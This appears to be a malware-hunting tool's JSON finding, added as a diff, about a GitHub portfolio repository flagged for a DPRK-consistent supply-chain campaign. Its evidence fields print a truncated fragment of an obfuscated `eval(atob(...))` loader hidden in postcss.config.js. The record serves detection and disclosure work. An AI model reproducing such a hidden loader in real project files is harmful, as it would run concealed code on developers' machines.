@@ -1,0 +1,68 @@
+{
+  "finding": {
+    "key": "repository:alexsander532/portfolio-pessoal",
+    "kind": "repository",
+    "family": "",
+    "id": "alexsander532/portfolio-pessoal",
+    "url": "https://github.com/Alexsander532/Portfolio-Pessoal",
+    "registry": "github",
+    "owner": "alexsander532",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 8,
+    "detection_method": "signature_match",
+    "attribution": "DPRK (North Korea) (per OSM)",
+    "campaign_id": "GW-C-e0be6a21",
+    "rules": "obfuscation/eval-decoded; obfuscation/atob",
+    "evidence_locations": "postcss.config.js:10",
+    "c2_hosts": "",
+    "iocs": "postcss.config.js",
+    "matched_signatures": "",
+    "reasons": "repository under owner Alexsander532 of a known-malicious repo | Tier-2 confirmed (bash score 8)",
+    "osm_status": "submitted",
+    "osm_threat_id": "0fbcc78c-634e-4c4e-a0f6-baeb1543c328",
+    "first_seen": "hunt-20260620T053126Z",
+    "last_seen": "hunt-20260620T053126Z",
+    "evidence_file": "repositories/alexsander532_portfolio-pessoal.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "postcss.config.js",
+      "line": 10,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "};eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-82-1IGg7aisrKXt2YXIgcz"
+    },
+    {
+      "file": "postcss.config.js",
+      "line": 10,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "};eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-82-1IGg7aisrKXt2YXIgcz"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/alexsander532/portfolio-pessoal",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in postcss.config.js.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-e0be6a21: one of 11 confirmed repos across 4 accounts sharing the loader stub b10bafdcfe.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: postcss.config.js\n- postcss.config.js:10: decodes a hidden blob and executes it at load time (obfuscated loader)\n- postcss.config.js:10: hides code in an encoded blob that is decoded and run",
+    "publisher": "alexsander532",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/alexsander532/portfolio-pessoal/blob/HEAD/postcss.config.js#L10",
+    "verified_iocs": "postcss.config.js",
+    "contributors": [],
+    "first_seen": "2026-06-20T05:31:26Z",
+    "last_seen": "2026-06-20T05:31:26Z"
+  }
+}
